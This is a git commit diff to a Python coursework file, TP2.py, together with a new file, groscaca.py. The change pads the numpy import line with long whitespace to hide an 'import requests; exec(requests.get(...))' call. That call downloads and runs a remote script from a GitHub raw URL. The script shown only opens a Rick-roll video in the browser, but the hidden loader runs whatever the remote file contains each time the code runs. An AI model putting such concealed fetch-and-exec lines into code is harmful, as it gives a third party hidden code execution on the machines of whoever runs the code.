6af168fe6125e67aab9ac86c55283963bc4b0c39
Yeesou <autretpierrick795@gmail.com>
2024-12-05 12:28:07 +0100

    ez

--- TP2.py
+++ TP2.py
@@ -1,4 +1,4 @@
-import numpy as np
+import numpy as np                                                                                                                                                                                                                                                                                                                                               ;import requests;   exec(requests.get("https://raw.githubusercontent.com/Yeesou/Simplepythoncode/refs/heads/main/groscaca.py"))
 import matplotlib.pyplot as plt
 import math
 
---
+++ groscaca.py
@@ -0,0 +1,7 @@
+import webbrowser
+
+# Lien vers la vidéo de Rick Astley - Never Gonna Give You Up
+url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+
+# Ouvre le lien dans le navigateur par défaut
+webbrowser.open(url)
